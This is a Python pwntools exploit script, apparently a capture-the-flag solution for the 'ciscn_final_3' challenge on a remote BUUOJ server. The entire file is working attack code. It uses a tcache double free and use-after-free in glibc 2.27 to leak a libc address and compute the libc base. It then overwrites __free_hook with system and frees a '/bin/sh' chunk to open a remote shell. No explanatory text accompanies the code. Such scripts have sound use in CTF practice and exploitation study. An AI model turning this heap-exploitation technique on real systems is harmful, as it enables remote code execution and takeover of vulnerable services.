from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-27/ld-2.27.so"
libc_path = "/home/fanxinli/libc-so/libc-2.27-64.so"
# p = process([ld_path, "./ciscn_final_3"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 26435)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(index, size, con):
    sla("choice > ", "1")
    sla("input the index", str(index))
    sla("input the size", str(size))
    sa("now you can write something", con)
    rud("gift :")
    info = int(rud("\n").decode("ISO-8859-1"), 16)

    return info 

def free(index):
    sla("choice > ", "2")
    sla("input the index", str(index))


# double free + uaf

# leak libc
info = add(0, 0x30, "a")
for i in range(1, 11):
    add(i, 0x70, "a")
add(11, 0x10, "a")
free(0)
free(0)
add(12, 0x30, p64(info+0x30))
add(13, 0x30, "a")
add(14, 0x30, p64(0)+p64(0x501))
free(1)

free(2)
add(15, 0x40, "a")
add(16, 0x20, "a")
add(17, 0x70, "a")
info = add(18, 0x70, "a")
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
base = info-0x70-libc.sym["__malloc_hook"]
print("base: ", hex(base))
free_hook = base+libc.sym["__free_hook"]
system = base+libc.sym["system"]

# alloc to free_hook
free(16)
free(16)
add(19, 0x20, p64(free_hook))
add(20, 0x20, "/bin/sh\x00")
add(21, 0x20, p64(system))

# attack
free(20)

shell()


